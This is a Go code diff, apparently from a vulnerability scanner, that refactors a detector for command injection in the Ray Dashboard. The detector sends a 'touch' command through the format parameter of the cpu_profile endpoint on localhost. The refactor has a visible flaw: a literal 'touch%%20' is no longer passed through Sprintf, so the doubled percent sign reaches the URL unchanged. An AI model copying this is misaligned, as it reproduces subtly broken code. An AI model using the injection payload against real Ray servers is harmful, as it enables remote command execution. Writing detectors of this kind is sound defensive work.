@@ -24,6 +24,7 @@ import (
 	"fmt"
 	"io/fs"
 	"math/rand"
+	"net"
 	"net/http"
 	"os"
 	"strconv"
@@ -184,10 +185,10 @@ func isDashboardPresent(ctx context.Context) bool {
 // attemptExploit attempts to exploit the vulnerability by touching a random file via HTTP query
 func attemptExploit(ctx context.Context) string {
 	// Generate a random file path
-	randomFilePath := fmt.Sprintf("/tmp/%s", generateRandomString(16))
+	randomFilePath := "/tmp/" + generateRandomString(16)
 
 	// Format the command for the query
-	testCmd := fmt.Sprintf("touch%%20%s", randomFilePath)
+	testCmd := "touch%%20" + randomFilePath
 	// Perform the HTTP query
 	statusCode := rayRequest(ctx, "127.0.0.1", 8265, testCmd)
 	log.Infof("HTTP request returned status code: %d", statusCode)
@@ -196,7 +197,7 @@ func attemptExploit(ctx context.Context) string {
 
 // rayRequest sends an HTTP GET request to the Ray Dashboard and executes the provided command
 func rayRequest(ctx context.Context, host string, port int, cmd string) int {
-	url := fmt.Sprintf("http://%s:%d/worker/cpu_profile?pid=3354&ip=127.0.0.1&duration=5&native=0&format=%s", host, port, cmd)
+	url := fmt.Sprintf("http://%s/worker/cpu_profile?pid=3354&ip=127.0.0.1&duration=5&native=0&format=%s", net.JoinHostPort(host, strconv.Itoa(port)), cmd)
 
 	// Create a new HTTP request
 	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
@@ -225,8 +226,6 @@ func fileExists(filesys scalibrfs.FS, path string) bool {
 
 // Generate a random string of the given length
 func generateRandomString(length int) string {
-	rand.Seed(time.Now().UnixNano())
-
 	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
 	bytes := make([]byte, length)
 	for i := range length {
